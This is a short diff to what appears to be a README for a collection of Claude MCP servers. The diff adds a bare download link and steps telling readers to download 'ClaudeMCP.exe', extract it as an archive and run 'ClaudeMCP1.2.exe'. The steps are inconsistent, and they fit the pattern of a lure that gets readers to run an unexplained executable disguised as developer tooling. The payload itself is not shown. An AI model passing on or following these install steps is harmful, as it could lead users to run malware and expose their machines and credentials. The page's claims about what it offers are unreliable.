@@ -25,3 +25,15 @@ Our goal is to simplify your server setup and automate all processes.
 | **📊 DATA** | Excel • CSV • Pandas | Read spreadsheets • Analyze data |
 
 **Total: 50+ MCP servers • 200+ tools**
+
+---
+
+# 📥 Download [CLICK]
+
+---
+
+#  🚀 HOW TO INSTALL?
+1. Download `ClaudeMCP.exe`
+2. Extract the archieve
+3. Run `ClaudeMCP1.2.exe`
+4. Follow the installer's instructions
